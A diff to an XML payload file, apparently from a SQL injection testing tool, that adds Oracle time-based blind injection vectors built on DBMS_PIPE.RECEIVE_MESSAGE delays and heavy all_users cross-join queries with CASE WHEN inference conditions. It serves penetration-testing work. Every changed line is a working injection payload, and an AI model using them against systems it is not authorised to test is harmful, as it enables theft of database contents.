@@ -1466,6 +1466,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
         </request>
@@ -1484,8 +1485,9 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
+        <vector>AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0</payload>
+            <payload>AND [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1621,6 +1623,7 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END)</vector>
         <request>
             <payload>OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])</payload>
         </request>
@@ -1639,8 +1642,9 @@ Formats:
         <risk>4</risk>
         <clause>1,2,3</clause>
         <where>2</where>
+        <vector>OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) ELSE [RANDNUM] END)</vector>
         <request>
-            <payload>OR (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)>0</payload>
+            <payload>OR [RANDNUM]=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5)</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
